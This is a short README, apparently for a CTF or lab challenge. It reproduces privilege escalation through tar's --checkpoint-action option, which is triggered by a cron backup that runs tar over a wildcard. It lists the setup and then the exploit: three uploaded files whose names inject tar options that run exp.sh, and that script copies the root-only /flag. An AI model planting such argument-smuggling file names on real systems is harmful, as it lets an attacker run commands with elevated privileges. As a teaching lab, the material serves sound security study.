## Tar-Vuln-server

复现利用tar指令checkpoint-action参数提权

配置：

```
su
cd / && echo flag{xxxxxx} > flag && chmod 400 flag
cd [app dir]
bash cron.sh&
su [normal user]
chmod +x main
./main
```

利用：
通过Web上传三个文件，文件名为：
```
--checkpoint=1
--checkpoint-action=exec=sh exp.sh
exp.sh
```

exp.sh内容为`cat /flag > 1.txt`

过一分钟备份后就会在目录下看到1.txt，读取即为flag
